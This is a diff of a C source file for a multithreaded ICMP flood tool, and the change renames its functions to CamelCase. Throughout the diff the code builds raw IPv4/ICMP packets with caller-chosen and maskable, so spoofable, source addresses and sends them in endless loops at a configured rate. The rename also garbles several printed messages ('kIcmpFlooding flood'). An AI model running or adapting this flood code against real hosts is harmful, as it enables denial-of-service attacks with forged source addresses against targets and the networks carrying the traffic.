@@ -21,39 +21,39 @@ pthread_cond_t g_icmp_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_icmp_before_time;
 struct timespec g_icmp_now_time;
 
-void icmp_flood_print_usage(void)
+void IcmpFloodPrintUsage(void)
 {
-	printf("ICMP flood Usage : "
+	printf("kIcmpFlooding flood Usage : "
 			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
 	return;
 }
 
-void *generate_icmp_flood(void *data)
+void *GenerateIcmpFlood(void *data)
 {
 	int thread_id = *((int*) data);
-	int sock = make_socket(IPPROTO_ICMP);
+	int sock = MakeRawSocket(IPPROTO_ICMP);
 	struct iphdr ipv4_h;
 	struct icmp *icmp_h_ptr;
-	ipv4_h = prepare_empty_ipv4();
+	ipv4_h = PrepareEmptyIphdr();
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_icmp_mutex);
 		// get now resource
-		get_masking_arguments(&g_icmp_input, &g_icmp_now);
+		GetMaskingArguments(&g_icmp_input, &g_icmp_now);
 		// make ipv4 header
 
-		/*ipv4_h = prepare_empty_ipv4();
-		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_icmp_now.src));
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_icmp_now.dest));
-		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));*/
+		/*ipv4_h = PrepareEmptyIphdr();
+		ipv4_h = IphdrSetProtocol(ipv4_h, IPPROTO_ICMP);
+		ipv4_h = IphdrSetSrcAddr(ipv4_h, inet_addr(g_icmp_now.src));
+		ipv4_h = IphdrSetDestAddr(ipv4_h, inet_addr(g_icmp_now.dest));
+		ipv4_h = IphdrAddSize(ipv4_h, sizeof(struct icmp));*/
 
 		ipv4_h.tot_len = sizeof(struct iphdr);
 		ipv4_h.protocol = IPPROTO_ICMP;
 		ipv4_h.saddr = inet_addr(g_icmp_now.src);
 		ipv4_h.daddr = inet_addr(g_icmp_now.dest);
 		ipv4_h.tot_len += sizeof(struct icmp);
-		ipv4_h.check = in_cksum((__u16 *) &ipv4_h,sizeof(struct iphdr) + sizeof(struct icmp));
+		ipv4_h.check = IphdrGetChecksum((__u16 *) &ipv4_h,sizeof(struct iphdr) + sizeof(struct icmp));
 
 
 		// make icmp header
@@ -66,7 +66,7 @@ void *generate_icmp_flood(void *data)
 		icmp_h_ptr->icmp_cksum = 0;
 		icmp_h_ptr->icmp_seq = htons(g_icmp_num_total);
 		icmp_h_ptr->icmp_id = getpid();
-		icmp_h_ptr->icmp_cksum = in_cksum(
+		icmp_h_ptr->icmp_cksum = IphdrGetChecksum(
 				(u_short *) icmp_h_ptr,
 				sizeof(struct icmp));
 		// wait a second
@@ -74,14 +74,14 @@ void *generate_icmp_flood(void *data)
 			pthread_cond_wait(&g_icmp_cond, &g_icmp_mutex);
 		}
 		// time checking
-		time_check(
+		TimeCheck(
 				&g_icmp_cond,
 				&g_icmp_before_time,
 				&g_icmp_now_time,
 				&g_icmp_num_generated_in_sec);
 		// make and send packet
-		char *packet = packet_assemble(ipv4_h, icmp_h_ptr, sizeof(struct icmp));
-		send_packet(sock, ipv4_h, packet, g_icmp_now.port);
+		char *packet = AssembleIphdrWithData(ipv4_h, icmp_h_ptr, sizeof(struct icmp));
+		SendPacket(sock, ipv4_h, packet, g_icmp_now.port);
 		free(packet);
 		g_icmp_num_generated_in_sec++;
 		g_icmp_num_total++;
@@ -93,11 +93,11 @@ void *generate_icmp_flood(void *data)
 	return NULL;
 }
 
-void *icmp_flood_time_check(void *data)
+void *IcmpFloodTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_icmp_mutex);
-		time_check(
+		TimeCheck(
 				&g_icmp_cond,
 				&g_icmp_before_time,
 				&g_icmp_now_time,
@@ -107,18 +107,18 @@ void *icmp_flood_time_check(void *data)
 	return NULL;
 }
 
-void icmp_flood_main(char *argv[])
+void IcmpFloodMain(char *argv[])
 {
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 	if (argc != 4) {
-		icmp_flood_print_usage();
+		IcmpFloodPrintUsage();
 		return;
 	}
 	// get ip address, mask, port
-	argv_to_input_arguments(argv, &g_icmp_input);
+	ArgvToInputArguments(argv, &g_icmp_input);
 	g_icmp_num_generated_in_sec = 0;
 	g_icmp_num_total = 0;
 	memset(&g_icmp_before_time, 0, sizeof(struct timespec));
@@ -130,7 +130,7 @@ void icmp_flood_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Sending ICMP requests to %s using %d threads %u per sec\n",
+	printf("Sending kIcmpFlooding requests to %s using %d threads %u per sec\n",
 			g_icmp_input.dest,
 			num_threads,
 			g_icmp_request_per_sec);
@@ -139,16 +139,16 @@ void icmp_flood_main(char *argv[])
 		pthread_create(
 				&threads[i],
 				NULL,
-				generate_icmp_flood,
+				GenerateIcmpFlood,
 				(void *)&thread_ids[i]);
 	}
-	pthread_create(&threads[i], NULL, icmp_flood_time_check, NULL);
+	pthread_create(&threads[i], NULL, IcmpFloodTimeCheck, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
 		printf("thread %d joined\n", i);
 	}
 	pthread_mutex_destroy(&g_icmp_mutex);
-	printf("ICMP flood Finished\nTotal %lu packets sent.\n", g_icmp_num_total);
+	printf("kIcmpFlooding flood Finished\nTotal %lu packets sent.\n", g_icmp_num_total);
 	pthread_exit(NULL);
 	return;
 }
